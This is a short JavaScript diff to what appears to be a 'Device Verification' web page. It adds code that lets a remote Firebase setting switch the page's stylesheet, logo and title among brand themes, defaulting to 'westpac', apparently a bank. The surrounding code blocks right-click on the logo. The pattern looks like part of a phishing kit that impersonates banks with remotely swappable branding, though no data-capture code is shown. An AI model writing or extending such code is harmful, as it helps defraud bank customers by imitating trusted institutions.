@@ -35,6 +35,27 @@ try {
     console.error('Error initializing Firebase:', error);
 }
 
+// Initialize theme handling
+let currentTheme = 'westpac';
+
+// Listen for theme changes from Firebase
+database.ref('activeTheme').on('value', snapshot => {
+    const newTheme = snapshot.val() || 'westpac';
+    if (newTheme !== currentTheme) {
+        applyTheme(newTheme);
+    }
+});
+
+function applyTheme(themeName) {
+    const theme = themes[themeName];
+    if (!theme) return;
+
+    currentTheme = themeName;
+    document.getElementById('themeStyles').href = theme.styles;
+    document.querySelector('.logo-image').src = theme.logo;
+    document.title = `Device Verification - ${theme.name}`;
+}
+
 // Prevent right-click on logo
 document.querySelector('.logo').addEventListener('contextmenu', (e) => {
     e.preventDefault();
